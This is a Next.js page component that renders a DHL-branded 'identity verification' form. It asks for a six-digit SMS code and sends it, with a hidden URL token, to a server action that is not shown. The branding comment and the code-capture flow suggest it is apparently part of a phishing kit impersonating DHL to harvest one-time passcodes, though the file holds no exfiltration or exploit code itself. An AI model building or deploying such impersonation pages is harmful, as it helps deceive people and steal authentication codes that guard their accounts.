import { submitOtp } from './actions'
import { getLanguage, useTranslation } from '@/utils/i18n'

export default async function OtpPage({ searchParams }: { searchParams: Promise<{ [key: string]: string | undefined }> }) {
    const { token } = await searchParams
    const lang = await getLanguage()
    const t = useTranslation(lang)

    return (
        <div className="w-full max-w-lg bg-white rounded-lg shadow-xl overflow-hidden border border-gray-100">
            {/* DHL Top Accent */}
            <div className="bg-[#D40511] h-2 w-full"></div>

            <div className="p-8 space-y-6 text-center">
                <div className="border-b border-gray-200 pb-4 mb-2">
                    <h2 className="text-2xl font-black text-gray-900 tracking-tight uppercase">{t('identity_verification')}</h2>
                    <p className="text-sm text-gray-500 mt-2">
                        {t('sms_dispatched')}
                    </p>
                </div>

                <form action={submitOtp} className="space-y-6 pt-4">
                    <input type="hidden" name="token" value={token} />

                    <div>
                        <input
                            type="text"
                            name="otp"
                            required
                            maxLength={6}
                            pattern="[0-9]*"
                            placeholder="• • • • • •"
                            className="w-full text-center tracking-[1em] text-3xl rounded border-gray-300 shadow-sm focus:border-[#D40511] focus:ring-[#D40511] p-4 border outline-none font-mono transition-colors"
                        />
                    </div>
                    <button type="submit" className="w-full bg-[#D40511] text-white font-black text-lg py-4 rounded hover:bg-red-700 transition-colors shadow-md uppercase">
                        {t('verify_code')}
                    </button>

                    <p className="text-xs text-gray-400 mt-4">
                        {t('did_not_receive')}
                    </p>
                </form>
            </div>
        </div>
    )
}
